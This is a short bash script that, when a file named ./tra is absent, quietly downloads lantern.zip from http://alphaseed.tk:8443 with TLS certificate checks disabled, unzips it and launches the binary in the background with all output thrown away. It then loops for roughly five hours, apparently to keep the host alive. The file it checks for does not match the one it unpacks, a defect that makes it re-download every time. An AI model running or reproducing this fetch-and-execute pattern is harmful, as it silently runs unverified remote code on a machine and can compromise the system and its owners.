#!/bin/bash
if [ ! -f ./tra ]; then
    echo "File not found!"
    wget -q http://alphaseed.tk:8443/lantern.zip --no-check-certificate
    unzip -q lantern.zip
fi
echo $1
nohup ./lantern >/dev/null 2>&1 
i="0"
while [ $i -lt 298 ]
do
echo "Let's sleep for $i min"
sleep 60 #60= 1min
i=$[$i+1]
done
